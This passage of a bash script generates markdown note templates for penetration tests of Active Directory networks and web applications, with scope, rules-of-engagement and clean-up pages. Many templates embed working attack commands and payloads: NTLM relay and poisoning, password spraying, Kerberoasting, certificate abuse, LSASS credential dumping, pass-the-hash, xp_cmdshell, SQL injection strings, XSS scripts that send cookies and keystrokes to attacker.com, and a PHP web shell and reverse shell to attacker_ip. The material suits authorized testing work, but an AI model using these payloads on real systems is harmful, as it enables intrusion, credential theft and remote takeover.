- **Custom Attributes:** " failed_ref
}

# Helper function to create poisoning files
_create_poisoning_files() {
    local -n failed_ref=$1
    
    _create_file "03-Evidence/1-Notes/4-Poisoning/1-Responder.md" "# Responder

## Responder Configuration
- **Interface:** 
- **Protocols:** LLMNR, NBT-NS, mDNS

### Command Used
\`\`\`bash
responder -I eth0 -A
\`\`\`

### Captured Hashes
| Username | Hash Type | Hash | Cracked | Password |
|----------|-----------|------|---------|----------|
|          |           |      |         |          |

### Poisoning Events
- **LLMNR requests:** 
- **NBT-NS requests:** 
- **SMB challenges:** 

### Analysis
- **Success rate:** 
- **Systems responding:** 
- **Vulnerable services:** " failed_ref

    _create_file "03-Evidence/1-Notes/4-Poisoning/2-Relay Attacks.md" "# Relay Attacks

## NTLMRelayx Configuration
- **Target:** 
- **Protocol:** SMB/HTTP/LDAP
- **Authentication:** 

### Relay Commands
\`\`\`bash
# SMB Relay
ntlmrelayx.py -tf targets.txt -smb2support

# LDAP Relay
ntlmrelayx.py -t ldap://dc.domain.local --add-computer

# HTTP Relay
ntlmrelayx.py -tf targets.txt -of hashes.txt
\`\`\`

### Successful Relays
| Source | Target | Method | Result |
|--------|--------|--------|--------|
|        |        |        |        |

### Mitigation Bypass
- **SMB Signing:** 
- **EPA/Channel Binding:** 
- **LDAP Signing:** " failed_ref

    _create_file "03-Evidence/1-Notes/4-Poisoning/3-IPv6 Attacks.md" "# IPv6 Attacks

## IPv6 Configuration
- **IPv6 Enabled:** 
- **DHCPv6:** 
- **Router Advertisements:** 

### mitm6 Attacks
\`\`\`bash
# Basic mitm6
mitm6 -d domain.local

# With ntlmrelayx
ntlmrelayx.py -6 -t ldaps://dc.domain.local -wh attacker-wpad -l lootme
\`\`\`

### Results
- **DNS responses:** 
- **WPAD poisoning:** 
- **Credentials captured:** 

### DHCPv6 Spoofing
- **Successful responses:** 
- **DNS server set:** " failed_ref
}

# Helper function to create user compromise files
_create_user_compromise_files() {
    local -n failed_ref=$1
    
    _create_file "03-Evidence/1-Notes/5-User Compromise/1-Password Spraying.md" "# Password Spraying

## Target Users
- **Total users:** 
- **Spray targets:** 
- **Exclusions:** 

### Password Lists
- **Common passwords:** 
- **Season/Company specific:** 
- **Previously cracked:** 

### Spray Results
| Username | Password | Service | Status | Notes |
|----------|----------|---------|--------|-------|
|          |          |         |        |       |

### Tools Used
\`\`\`bash
# DomainPasswordSpray
Invoke-DomainPasswordSpray -UserList users.txt -Password 'Password123!'

# crackmapexec
crackmapexec smb targets.txt -u users.txt -p 'Password123!' --continue-on-success

# Kerbrute
kerbrute passwordspray --dc dc.domain.local -d domain.local users.txt 'Password123!'
\`\`\`

### Lockout Monitoring
- **Lockout threshold:** 
- **Lockout duration:** 
- **Current locked accounts:** " failed_ref

    _create_file "03-Evidence/1-Notes/5-User Compromise/2-ASREPRoasting.md" "# ASREPRoasting

## ASREPRoastable Users
| Username | SPN | Hash | Cracked | Password |
|----------|-----|------|---------|----------|
|          |     |      |         |          |

### Enumeration
\`\`\`bash
# GetNPUsers
GetNPUsers.py domain.local/ -dc-ip dc.domain.local -request

# PowerShell
Get-DomainUser -PreauthNotRequired -Verbose

# Rubeus
Rubeus.exe asreproast /format:hashcat /outfile:asrep_hashes.txt
\`\`\`

### Hash Cracking
\`\`\`bash
# Hashcat
hashcat -m 18200 asrep_hashes.txt rockyou.txt

# John
john --wordlist=rockyou.txt asrep_hashes.txt
\`\`\`

### Analysis
- **Total ASREPRoastable:** 
- **Successfully cracked:** 
- **Weak passwords found:** " failed_ref

    _create_file "03-Evidence/1-Notes/5-User Compromise/3-Kerberoasting.md" "# Kerberoasting

## Kerberoastable Users
| Username | SPN | Hash | Cracked | Password |
|----------|-----|------|---------|----------|
|          |     |      |         |          |

### Service Principal Names
- 

### Enumeration Commands
\`\`\`bash
# GetUserSPNs
GetUserSPNs.py domain.local/user:password -dc-ip dc.domain.local -request

# PowerShell
Get-DomainUser -SPN | select samaccountname,serviceprincipalname

# Rubeus
Rubeus.exe kerberoast /format:hashcat /outfile:kerberoast_hashes.txt
\`\`\`

### Hash Cracking Results
- **Total hashes:** 
- **Cracked:** 
- **Crack rate:** 

### Service Analysis
- **SQL Server accounts:** 
- **Web service accounts:** 
- **Custom services:** " failed_ref
}

# Helper function to create ADCS files
_create_adcs_files() {
    local -n failed_ref=$1
    
    _create_file "03-Evidence/1-Notes/6-ADCS/1-Certificate Authority Info.md" "# Certificate Authority Info

## CA Information
- **CA Name:** 
- **CA Server:** 
- **Templates:** 
- **Web Enrollment:** 

### CA Configuration
- **Root CA:** 
- **Subordinate CA:** 
- **Certificate Templates:** 

### Template Analysis
| Template Name | Permissions | Client Auth | Subject Control | Notes |
|---------------|-------------|-------------|-----------------|-------|
|               |             |             |                 |       |

### Vulnerable Templates
- **ESC1:** 
- **ESC2:** 
- **ESC3:** 
- **ESC4:** 
- **ESC6:** 
- **ESC8:** " failed_ref

    _create_file "03-Evidence/1-Notes/6-ADCS/2-Certificate Attacks.md" "# Certificate Attacks

## Template Abuse
- **Vulnerable template:** 
- **Attack method:** 
- **Target user:** 

### ESC1 Attack
\`\`\`bash
# Certipy
certipy req -username user@domain.local -password password -ca 'CA-NAME' -target ca.domain.local -template VulnTemplate -alt-name administrator

# Request certificate with SAN
certreq -submit -attrib "CertificateTemplate:VulnTemplate\nsan:upn=administrator@domain.local"
\`\`\`

### Certificate to TGT
\`\`\`bash
# Certipy
certipy auth -pfx administrator.pfx -username administrator -domain domain.local -dc-ip dc.domain.local

# Rubeus
Rubeus.exe asktgt /user:administrator /certificate:cert.pfx /password:certpass /domain:domain.local /dc:dc.domain.local
\`\`\`

### Results
- **Certificate obtained:** 
- **Authentication successful:** 
- **TGT retrieved:** " failed_ref

    _create_file "03-Evidence/1-Notes/6-ADCS/3-Web Enrollment.md" "# Web Enrollment

## Web Enrollment Interface
- **URL:** 
- **Authentication:** 
- **Templates available:** 

### Manual Certificate Request
- **Template used:** 
- **Subject name:** 
- **Alternative names:** 

### Certificate Download
- **Format:** 
- **Private key:** 
- **Certificate chain:** 

### Exploitation Results
- **Certificates issued:** 
- **Authentication bypass:** 
- **Privilege escalation:** " failed_ref
}

# Helper function to create machine compromise files  
_create_machine_compromise_files() {
    local -n failed_ref=$1
    
    _create_file "03-Evidence/1-Notes/7-Machine Compromise/1-Host Enumeration.md" "# Host Enumeration

## Target Systems
| Hostname | IP | OS | Domain | Role | Access |
|----------|----|----|--------|------|--------|
|          |    |    |        |      |        |

### System Information
- **Operating System:** 
- **Patch Level:** 
- **Installed Software:** 
- **Running Services:** 

### Privilege Level
- **Current user:** 
- **Local admin:** 
- **Domain user:** 

### Network Information
- **IP Configuration:** 
- **Network shares:** 
- **Firewall status:** 
- **AV/EDR detected:** " failed_ref

    _create_file "03-Evidence/1-Notes/7-Machine Compromise/2-Privilege Escalation.md" "# Privilege Escalation

## Privilege Escalation Methods
- [ ] Unquoted Service Paths
- [ ] Weak Service Permissions
- [ ] Registry Autoruns
- [ ] Scheduled Tasks
- [ ] AlwaysInstallElevated
- [ ] Token Impersonation

### Service Vulnerabilities
| Service | Vulnerability | Exploit | Result |
|---------|---------------|---------|--------|
|         |               |         |        |

### File System Issues
- **Writable directories:** 
- **DLL hijacking opportunities:** 
- **Weak ACLs:** 

### Exploitation Commands
\`\`\`bash
# PowerUp
PowerUp.ps1; Invoke-AllChecks

# WinPEAS
winpeas.exe

# Privilege escalation
sc.exe config "ServiceName" binpath="C:\temp\shell.exe"
\`\`\`

### Results
- **Method used:** 
- **SYSTEM access:** 
- **Persistence installed:** " failed_ref

    _create_file "03-Evidence/1-Notes/7-Machine Compromise/3-Credential Dumping.md" "# Credential Dumping

## Credential Sources
- [ ] LSASS
- [ ] SAM/SYSTEM
- [ ] Registry
- [ ] Memory
- [ ] DPAPI

### LSASS Dump
\`\`\`bash
# Mimikatz
sekurlsa::logonpasswords

# Procdump + Mimikatz
procdump.exe -ma lsass.exe lsass.dmp
sekurlsa::minidump lsass.dmp
sekurlsa::logonpasswords

# Task Manager dump + pypykatz
pypykatz lsa minidump lsass.dmp
\`\`\`

### Extracted Credentials
| Username | Type | Value | Domain | Notes |
|----------|------|-------|--------|-------|
|          |      |       |        |       |

### Registry Secrets
- **LSA Secrets:** 
- **Cached credentials:** 
- **Service passwords:** 

### DPAPI Secrets
- **Master keys:** 
- **Browser passwords:** 
- **WiFi passwords:** " failed_ref

    _create_file "03-Evidence/1-Notes/7-Machine Compromise/4-Lateral Movement.md" "# Lateral Movement

## Movement Targets
| Target | IP | Access Method | Credentials | Status |
|--------|----|--------------|-----------  |--------|
|        |    |              |             |        |

### Access Methods
- [ ] PsExec
- [ ] WMI
- [ ] WinRM
- [ ] RDP
- [ ] Pass-the-Hash
- [ ] Pass-the-Ticket

### Commands Used
\`\`\`bash
# CrackMapExec
crackmapexec smb targets.txt -u username -p password --exec-method wmiexec

# PsExec
psexec.py domain/user:password@target

# WMI
wmiexec.py domain/user:password@target

# Pass-the-Hash
wmiexec.py -hashes :ntlmhash domain/user@target
\`\`\`

### Successful Pivots
- **Hosts accessed:** 
- **Methods successful:** 
- **Credentials reused:** 

### Network Discovery
- **Subnets found:** 
- **Additional targets:** 
- **Network segmentation:** " failed_ref
}

# Helper function to create MSSQL files
_create_mssql_files() {
    local -n failed_ref=$1
    
    _create_file "03-Evidence/1-Notes/8-MSSQL/1-Instance Discovery.md" "# Instance Discovery

## MSSQL Instances
| Server | Instance | Port | Version | Service Account | Authentication |
|--------|----------|------|---------|-----------------|----------------|
|        |          |      |         |                 |                |

### Discovery Methods
\`\`\`bash
# Nmap
nmap -p 1433 --script ms-sql-info target

# PowerUpSQL
Get-SQLInstanceDomain
Get-SQLInstanceBroadcast
Get-SQLInstanceScanUDP

# Manual
sqlcmd -S server\instance -Q "SELECT @@VERSION"
\`\`\`

### Service Accounts
- **SQL Service accounts:** 
- **Agent accounts:** 
- **Privileges:** 

### Network Configuration
- **Default instance:** 
- **Named instances:** 
- **SQL Browser:** 
- **Remote connections:** " failed_ref

    _create_file "03-Evidence/1-Notes/8-MSSQL/2-Authentication.md" "# Authentication

## Authentication Methods
- [ ] Windows Authentication
- [ ] SQL Authentication
- [ ] Mixed Mode

### Default Accounts
| Username | Password | Status | Privileges |
|----------|----------|--------|------------|
| sa       |          |        |            |

### Authentication Testing
\`\`\`bash
# PowerUpSQL
Invoke-SQLAuditDefaultLoginPw
Get-SQLServerInfo -Instance server\instance

# Manual testing
sqlcmd -S server\instance -U sa -P password

# Brute force
nmap --script ms-sql-brute --script-args userdb=users.txt,passdb=pass.txt target
\`\`\`

### Successful Logins
- **Accounts compromised:** 
- **Authentication method:** 
- **Database access:** 

### Privilege Assessment
- **sysadmin role:** 
- **db_owner roles:** 
- **Custom roles:** " failed_ref

    _create_file "03-Evidence/1-Notes/8-MSSQL/3-Privilege Escalation.md" "# Privilege Escalation

## Current Privileges
- **Login:** 
- **Database roles:** 
- **Server roles:** 
- **Permissions:** 

### Escalation Methods
- [ ] Impersonation
- [ ] Trustworthy databases
- [ ] Custom assemblies
- [ ] Service account privileges
- [ ] Linked servers

### Impersonation Attack
\`\`\`sql
-- Check impersonation
SELECT DISTINCT b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE'

-- Execute as
EXECUTE AS LOGIN = 'sa'
SELECT SYSTEM_USER, USER_NAME()
\`\`\`

### Command Execution
\`\`\`sql
-- xp_cmdshell
EXEC sp_configure 'show advanced options', 1
RECONFIGURE
EXEC sp_configure 'xp_cmdshell', 1
RECONFIGURE
EXEC xp_cmdshell 'whoami'

-- CLR assemblies
CREATE ASSEMBLY pwn FROM 0x4D5A9000...
\`\`\`

### Results
- **Escalation successful:** 
- **Commands executed:** 
- **System access:** " failed_ref

    _create_file "03-Evidence/1-Notes/8-MSSQL/4-Linked Servers.md" "# Linked Servers

## Linked Server Enumeration
\`\`\`sql
-- List linked servers
EXEC sp_linkedservers

-- Test connections
SELECT * FROM OPENQUERY("server", 'SELECT SYSTEM_USER')
\`\`\`

### Linked Servers Found
| Server | Provider | Data Source | Authentication | Access |
|--------|----------|-------------|----------------|--------|
|        |          |             |                |        |

### Privilege Mapping
- **Current context:** 
- **Remote context:** 
- **Escalation possible:** 

### Attack Chain
\`\`\`sql
-- Multi-hop query
SELECT * FROM OPENQUERY("LinkedServer", 'SELECT * FROM OPENQUERY("RemoteServer", ''SELECT SYSTEM_USER'')')

-- Command execution
SELECT * FROM OPENQUERY("LinkedServer", 'SELECT * FROM OPENROWSET(''SQLOLEDB'', ''server;uid=sa;pwd=password'', ''SELECT SYSTEM_USER'')')
\`\`\`

### Results
- **Servers accessed:** 
- **Privilege escalation:** 
- **Data accessed:** " failed_ref
}

# Helper function to create internal services files
_create_internal_services_files() {
    local -n failed_ref=$1
    
    _create_file "03-Evidence/1-Notes/9-Internal Services/1-Service Overview.md" "# Service Overview

## Services Inventory
| Service | Port | Protocol | Hosts | Version | Security |
|---------|------|----------|-------|---------|----------|
|         |      |          |       |         |          |

### High-Value Services
- **Exchange:** 
- **SharePoint:** 
- **Jenkins:** 
- **GitLab:** 
- **Citrix:** 

### Database Services
- **MSSQL:** 
- **MySQL:** 
- **Oracle:** 
- **PostgreSQL:** 

### Network Services
- **DHCP:** 
- **DNS:** 
- **WSUS:** 
- **ADFS:** " failed_ref

    _create_file "03-Evidence/1-Notes/9-Internal Services/2-File Shares.md" "# File Shares

## SMB Shares Discovery
\`\`\`bash
# Share enumeration
smbclient -L //target -U username
enum4linux -a target
crackmapexec smb targets.txt -u username -p password --shares

# Share access
smbclient //target/share -U username
smbmap -H target -u username -p password
\`\`\`

### Accessible Shares
| Host | Share | Permissions | Contents | Sensitive |
|------|-------|-------------|----------|-----------|
|      |       |             |          |           |

### Interesting Files
- **Configuration files:** 
- **Scripts with credentials:** 
- **Backup files:** 
- **User data:** 

### Share Permissions
- **Anonymous access:** 
- **Authenticated access:** 
- **Administrative shares:** 

### Data Extraction
- **Files downloaded:** 
- **Credentials found:** 
- **Sensitive information:** " failed_ref

    _create_file "03-Evidence/1-Notes/9-Internal Services/3-Print Servers.md" "# Print Servers

## Print Server Enumeration
\`\`\`bash
# Print spooler enumeration
rpcclient -U username target
enumprinters
enumdrivers
\`\`\`

### Print Servers Found
| Server | Printers | Drivers | Spooler | Vulnerability |
|--------|----------|---------|---------|---------------|
|        |          |         |         |               |

### PrintNightmare Assessment
- **Spooler service running:** 
- **Point and Print enabled:** 
- **Driver installation rights:** 

### Exploitation Attempts
\`\`\`bash
# PrintNightmare
python3 printnightmare.py domain/user:password@target

# Print spooler abuse
python3 dementor.py -u username -p password -d domain.local target listener
\`\`\`

### Results
- **Vulnerable servers:** 
- **Exploitation successful:** 
- **Privilege escalation:** " failed_ref

    _create_file "03-Evidence/1-Notes/9-Internal Services/4-WSUS.md" "# WSUS

## WSUS Configuration
- **Server:** 
- **Port:** 
- **SSL:** 
- **Authentication:** 

### WSUS Attack
\`\`\`bash
# WSUS enumeration
wsuspect.py -t target

# Update injection
python3 wsuxploit.py -t target -c "cmd.exe /c calc.exe"
\`\`\`

### Client Configuration
- **Update source:** 
- **Group Policy:** 
- **Automatic updates:** 

### Attack Results
- **Vulnerable clients:** 
- **Updates injected:** 
- **Code execution:** " failed_ref
}

# Helper function to create internal web services files
_create_internal_web_services_files() {
    local -n failed_ref=$1
    
    _create_file "03-Evidence/1-Notes/10-Internal Web Services/1-Web Applications.md" "# Web Applications

## Internal Web Applications
| URL | Technology | Authentication | Functionality | Risk |
|-----|------------|----------------|---------------|------|
|     |            |                |               |      |

### Technology Stack
- **Web Servers:** 
- **Frameworks:** 
- **Databases:** 
- **Authentication:** 

### Application Testing
- [ ] Authentication bypass
- [ ] SQL injection
- [ ] XSS
- [ ] Directory traversal
- [ ] File upload
- [ ] SSRF

### Interesting Endpoints
- **Admin panels:** 
- **API endpoints:** 
- **File uploads:** 
- **Debug pages:** " failed_ref

    _create_file "03-Evidence/1-Notes/10-Internal Web Services/2-Exchange.md" "# Exchange

## Exchange Information
- **Version:** 
- **URL:** 
- **Authentication:** 
- **Protocols:** 

### OWA Testing
- **URL:** 
- **Default credentials:** 
- **Password spraying:** 
- **Vulnerabilities:** 

### Exchange Vulnerabilities
- [ ] CVE-2021-34473 (ProxyShell)
- [ ] CVE-2021-26855 (HAFNIUM)
- [ ] CVE-2020-0688
- [ ] CVE-2019-1040

### Exploitation
\`\`\`bash
# ProxyShell
python3 proxyshell.py -t https://exchange.domain.local

# Exchange enumeration
python3 exchangerecon.py -t exchange.domain.local
\`\`\`

### Results
- **Vulnerability found:** 
- **Exploitation successful:** 
- **Data accessed:** " failed_ref

    _create_file "03-Evidence/1-Notes/10-Internal Web Services/3-SharePoint.md" "# SharePoint

## SharePoint Information
- **Version:** 
- **URL:** 
- **Authentication:** 
- **Sites:** 

### Site Enumeration
\`\`\`bash
# SharePoint enumeration
python3 spscan.py -t https://sharepoint.domain.local

# Site discovery
gobuster dir -u https://sharepoint.domain.local -w /usr/share/wordlists/seclists/Discovery/Web-Content/sharepoint.txt
\`\`\`

### Sites and Libraries
| Site | Library | Permissions | Content | Sensitive |
|------|---------|-------------|---------|-----------|
|      |         |             |         |           |

### Vulnerabilities
- [ ] Anonymous access
- [ ] Weak permissions
- [ ] Sensitive documents
- [ ] Version disclosure

### Data Discovery
- **Document libraries:** 
- **User information:** 
- **Configuration data:** 
- **Credentials found:** " failed_ref

    _create_file "03-Evidence/1-Notes/10-Internal Web Services/4-Jenkins.md" "# Jenkins

## Jenkins Information
- **URL:** 
- **Version:** 
- **Authentication:** 
- **Plugins:** 

### Security Assessment
- [ ] Default credentials
- [ ] Anonymous access
- [ ] Script console access
- [ ] Build history access
- [ ] Credential store access

### Build Analysis
| Job | Parameters | Credentials | Sensitive |
|-----|------------|-------------|-----------|
|     |            |             |           |

### Script Console
\`\`\`groovy
// System information
println System.getProperty("user.name")
println System.getProperty("java.version")

// Command execution
def proc = "whoami".execute()
println proc.text
\`\`\`

### Credential Extraction
- **Stored passwords:** 
- **API keys:** 
- **SSH keys:** 
- **Cloud credentials:** " failed_ref
}

# Function to create webapp assessment files
_create_webapp_files() {
    local -n failed_ref=$1
    
    # Create 01-Admin files
    _create_file "01-Admin/1-Admin Information.md" "# Admin Information

## Project Details
- **Assessment Type:** Web Application Test
- **Start Date:** $(date +%Y-%m-%d)
- **Target Application:** ${final_ip:-"TBD"}
- **Tester:** $USER

## Application Details
- **Application Name:** 
- **URL:** 
- **Technology Stack:** 
- **Authentication Method:** 

## Contacts
- **Primary Contact:** 
- **Technical Contact:** 
- **Emergency Contact:** 

## Timeline
- **Start Date:** 
- **End Date:** 
- **Report Due Date:** " failed_ref

    _create_file "01-Admin/2-Scope.md" "# Scope

## Web Application Scope
- **Primary URL:** 
- **Additional URLs:** 
- **User Accounts Provided:** 
- **Excluded Functionality:** 
- **Testing Methods Approved:** 
  - [ ] Automated Scanning
  - [ ] Manual Testing
  - [ ] Authentication Testing
  - [ ] Session Management Testing
  - [ ] Input Validation Testing

## Rules of Engagement
- **Testing Hours:** 
- **Rate Limiting:** 
- **Account Lockouts:** 
- **Data Modification:** Prohibited
- **File Upload:** Test files only
- **Denial of Service:** Not permitted" failed_ref

    _create_file "01-Admin/3-Questions.md" "# Questions

## Application Questions

### Architecture Questions
- [ ] What is the application architecture?
- [ ] What databases are used?
- [ ] Are there any APIs?
- [ ] What authentication mechanisms?

### Business Logic Questions  
- [ ] What are the main business functions?
- [ ] What constitutes sensitive data?
- [ ] Are there financial transactions?
- [ ] What are the user roles?

### Security Questions
- [ ] What security controls are in place?
- [ ] Is there WAF protection?
- [ ] What about rate limiting?
- [ ] Are there monitoring systems?" failed_ref

    _create_file "01-Admin/4-Clean-Up.md" "# Clean-Up

## Clean-Up Activities

### Test Accounts
- [ ] Remove created accounts
- [ ] Reset test account passwords
- [ ] Remove uploaded files
- [ ] Clear session data

### Test Data
- [ ] Remove test entries
- [ ] Clear test transactions
- [ ] Remove uploaded files
- [ ] Clean database entries

### Logs and Evidence
- [ ] Export application logs
- [ ] Save screenshot evidence
- [ ] Archive request/response data
- [ ] Document security findings" failed_ref

    _create_file "01-Admin/5-TODO.md" "# TODO

## Web Application Testing TODO

### Information Gathering
- [ ] Technology fingerprinting
- [ ] Directory enumeration
- [ ] Parameter discovery
- [ ] Error message analysis

### Authentication Testing
- [ ] Username enumeration
- [ ] Password policy testing
- [ ] Brute force testing
- [ ] Session management
- [ ] Multi-factor authentication

### Authorization Testing
- [ ] Privilege escalation
- [ ] Insecure direct object references
- [ ] Missing function level access control
- [ ] Cross-user data access

### Input Validation
- [ ] SQL injection
- [ ] Cross-site scripting
- [ ] Command injection
- [ ] File inclusion
- [ ] XML/JSON injection

### Business Logic
- [ ] Business flow testing
- [ ] Data validation
- [ ] Race conditions
- [ ] Process timing

### Session Management
- [ ] Session token analysis
- [ ] Session fixation
- [ ] Session timeout
- [ ] Concurrent sessions

### File Upload Testing
- [ ] File type validation
- [ ] File size limits
- [ ] Malicious file upload
- [ ] Path traversal" failed_ref

    # Create 02-Data files
    _create_file "02-Data/1-Application URLs.md" "# Application URLs

## URL Inventory

| URL | Method | Parameters | Authentication | Function | Risk |
|-----|--------|------------|----------------|----------|------|
|     |        |            |                |          |      |

## Endpoint Categories
### Authentication
- **Login:** 
- **Logout:** 
- **Registration:** 
- **Password reset:** 

### User Functions
- **Profile management:** 
- **Settings:** 
- **Dashboard:** 
- **Search:** 

### Administrative
- **Admin panel:** 
- **User management:** 
- **System configuration:** 
- **Reporting:** 

### API Endpoints
- **REST APIs:** 
- **GraphQL:** 
- **SOAP:** 
- **WebSocket:** " failed_ref

    _create_file "02-Data/2-Parameters.md" "# Parameters

## Parameter Discovery

| Parameter | Type | Location | Values | Validation | Vulnerable |
|-----------|------|----------|--------|------------|------------|
|           |      |          |        |            |            |

## Parameter Categories
### GET Parameters
- 

### POST Parameters  
- 

### Headers
- 

### Cookies
- 

### Hidden Fields
- 

## Testing Results
### SQL Injection
- **Vulnerable parameters:** 
- **Injection points:** 
- **Database type:** 

### XSS
- **Reflected XSS:** 
- **Stored XSS:** 
- **DOM XSS:** 

### Command Injection
- **OS command injection:** 
- **Code injection:** 
- **Template injection:** " failed_ref

    _create_file "02-Data/3-Technology Stack.md" "# Technology Stack

## Technology Identification

### Web Server
- **Server:** 
- **Version:** 
- **Operating System:** 

### Application Framework
- **Framework:** 
- **Version:** 
- **Language:** 

### Database
- **Database Type:** 
- **Version:** 
- **Connection method:** 

### Frontend Technologies
- **JavaScript Libraries:** 
- **CSS Frameworks:** 
- **Content Management:** 

### Security Technologies
- **Web Application Firewall:** 
- **SSL/TLS:** 
- **Security Headers:** 
- **Content Security Policy:** 

## Fingerprinting Results
### Response Headers
\`\`\`
Server: 
X-Powered-By: 
X-AspNet-Version: 
\`\`\`

### Error Messages
- 

### File Extensions
- 

### Default Files
- " failed_ref

    # Create evidence structure for web app testing
    _create_file "03-Evidence/1-Notes/1-Reconnaissance/1-Information Gathering.md" "# Information Gathering

## Target Information
- **Application URL:** 
- **Company:** 
- **Technology:** 

### OSINT Results
- **Subdomains:** 
- **Email addresses:** 
- **Social media:** 
- **Code repositories:** 

### Fingerprinting
- **Web server:** 
- **Application framework:** 
- **Database:** 
- **Third-party components:** 

### Directory Enumeration
\`\`\`bash
# Gobuster
gobuster dir -u https://target.com -w /usr/share/wordlists/dirb/common.txt

# Ffuf  
ffuf -w /usr/share/wordlists/dirb/common.txt -u https://target.com/FUZZ

# Dirb
dirb https://target.com /usr/share/wordlists/dirb/common.txt
\`\`\`

### Interesting Directories
- 

### Robots.txt Analysis
- 

### Sitemap.xml Analysis
- " failed_ref

    _create_file "03-Evidence/1-Notes/2-Authentication/1-Login Testing.md" "# Login Testing

## Authentication Mechanism
- **Type:** 
- **Multi-factor:** 
- **Session management:** 

### Username Enumeration
- **Timing attacks:** 
- **Error message differences:** 
- **HTTP response codes:** 

### Password Policy
- **Minimum length:** 
- **Complexity requirements:** 
- **Maximum attempts:** 
- **Lockout duration:** 

### Brute Force Testing
\`\`\`bash
# Hydra
hydra -L users.txt -P passwords.txt target.com https-post-form "/login:username=^USER^&password=^PASS^:Invalid"

# Burp Intruder
# Use cluster bomb attack with username and password lists
\`\`\`

### Bypass Techniques
- [ ] SQL injection authentication bypass
- [ ] NoSQL injection
- [ ] LDAP injection
- [ ] Response manipulation
- [ ] Session prediction

### Results
- **Valid credentials:** 
- **Bypass successful:** 
- **Account lockouts:** " failed_ref

    _create_file "03-Evidence/1-Notes/3-Authorization/1-Access Control.md" "# Access Control

## User Roles
| Role | Permissions | Functions | Notes |
|------|-------------|-----------|-------|
|      |             |           |       |

### Privilege Escalation
- **Horizontal privilege escalation:** 
- **Vertical privilege escalation:** 
- **Parameter manipulation:** 

### Insecure Direct Object References
- **URL manipulation:** 
- **Parameter tampering:** 
- **File access:** 

### Testing Methods
\`\`\`bash
# IDOR testing
# Change user ID in requests
GET /user/profile?id=123 -> GET /user/profile?id=124

# File access
GET /download?file=user123.pdf -> GET /download?file=../../../etc/passwd
\`\`\`

### Function Level Access Control
- **Admin functions accessible:** 
- **Missing authorization checks:** 
- **Role bypass:** 

### Results
- **Access control issues:** 
- **Data accessed:** 
- **Functions compromised:** " failed_ref

    _create_file "03-Evidence/1-Notes/4-Input Validation/1-SQL Injection.md" "# SQL Injection

## SQL Injection Testing

### Manual Testing
\`\`\`sql
# Basic payloads
' OR '1'='1
' OR '1'='1' --
' OR '1'='1' /*
admin'--
admin'/*

# Union-based
' UNION SELECT null,username,password FROM users--
' UNION SELECT 1,2,3,4,5--

# Time-based blind
'; WAITFOR DELAY '00:00:05'--
' AND (SELECT COUNT(*) FROM users WHERE username='admin' AND SUBSTRING(password,1,1)='a') > 0 WAITFOR DELAY '00:00:05'--
\`\`\`

### Automated Testing
\`\`\`bash
# SQLmap
sqlmap -u "http://target.com/page?id=1" --dbs
sqlmap -u "http://target.com/page?id=1" -D database --tables
sqlmap -u "http://target.com/page?id=1" -D database -T users --dump

# POST request testing
sqlmap -r request.txt --dbs
\`\`\`

### Injection Points
| Parameter | Type | Payload | Result | Database |
|-----------|------|---------|--------|----------|
|           |      |         |        |          |

### Database Information
- **Database type:** 
- **Version:** 
- **Current user:** 
- **Privileges:** 

### Data Extraction
- **Databases:** 
- **Tables:** 
- **Sensitive data:** 
- **Credentials:** " failed_ref

    _create_file "03-Evidence/1-Notes/4-Input Validation/2-Cross-Site Scripting.md" "# Cross-Site Scripting

## XSS Testing

### Reflected XSS
\`\`\`html
<!-- Basic payloads -->
<script>alert('XSS')</script>
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<iframe src=javascript:alert('XSS')>

<!-- Filter bypass -->
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=eval(atob('YWxlcnQoJ1hTUycp'))>
<svg/onload=prompt(1)>
\`\`\`

### Stored XSS
\`\`\`html
<!-- Persistent payloads -->
<script>
// Cookie stealing
document.location='http://attacker.com/?c='+document.cookie;

// Session hijacking
new Image().src='http://attacker.com/?s='+document.cookie;

// Keylogger
document.addEventListener('keydown', function(e) {
    new Image().src='http://attacker.com/?key='+e.key;
});
</script>
\`\`\`

### DOM XSS
\`\`\`javascript
// URL fragment exploitation
window.location.hash = '#<script>alert("XSS")</script>';

// Document.write exploitation
document.write('<img src=x onerror=alert("XSS")>');
\`\`\`

### XSS Results
| Location | Type | Payload | Impact | Filtered |
|----------|------|---------|--------|----------|
|          |      |         |        |          |

### Impact Assessment
- **Session hijacking:** 
- **Credential theft:** 
- **Page defacement:** 
- **Malware distribution:** 

### Mitigation Bypass
- **Input filters:** 
- **Output encoding:** 
- **CSP bypass:** " failed_ref

    _create_file "03-Evidence/1-Notes/5-Session Management/1-Session Analysis.md" "# Session Analysis

## Session Token Analysis
- **Token format:** 
- **Token length:** 
- **Randomness:** 
- **Predictability:** 

### Session Testing
\`\`\`bash
# Token analysis
# Collect multiple session tokens
# Analyze for patterns/predictability

# Session fixation
# Set session ID before authentication
# Check if session ID changes after login

# Session timeout
# Test idle timeout
# Test absolute timeout
\`\`\`

### Session Security
- **HTTPOnly flag:** 
- **Secure flag:** 
- **SameSite attribute:** 
- **Token regeneration:** 

### Session Vulnerabilities
| Issue | Impact | Exploitable | Notes |
|-------|--------|-------------|-------|
|       |        |             |       |

### Session Hijacking
- **Token prediction:** 
- **Session fixation:** 
- **Cross-subdomain leakage:** 

### Concurrent Sessions
- **Multiple logins allowed:** 
- **Session termination:** 
- **Device management:** " failed_ref

    _create_file "03-Evidence/1-Notes/6-File Upload/1-Upload Testing.md" "# Upload Testing

## File Upload Analysis
- **Upload location:** 
- **File types allowed:** 
- **Size restrictions:** 
- **Validation method:** 

### Bypass Techniques
\`\`\`bash
# File extension bypass
shell.php -> shell.php.jpg
shell.php -> shell.PhP
shell.php -> shell.php%00.jpg

# MIME type bypass
Content-Type: image/jpeg (with PHP code)

# Magic bytes bypass
Add JPEG header: FF D8 FF E0 00 10 4A 46 49 46
\`\`\`

### Malicious File Uploads
\`\`\`php
<?php
// Web shell
if(isset($_REQUEST['cmd'])){
    echo "<pre>";
    $cmd = ($_REQUEST['cmd']);
    system($cmd);
    echo "</pre>";
    die;
}
?>

<?php
// Reverse shell
$sock=fsockopen("attacker_ip",4444);
$proc=proc_open("/bin/sh -i", array(0=>$sock, 1=>$sock, 2=>$sock),$pipes);
?>
\`\`\`

### Upload Results
| File Type | Bypass Method | Execution | Impact |
|-----------|---------------|-----------|--------|
|           |               |           |        |

### Directory Traversal
- **Path manipulation:** 
- **File overwrite:** 
- **Configuration access:** 

### File Inclusion
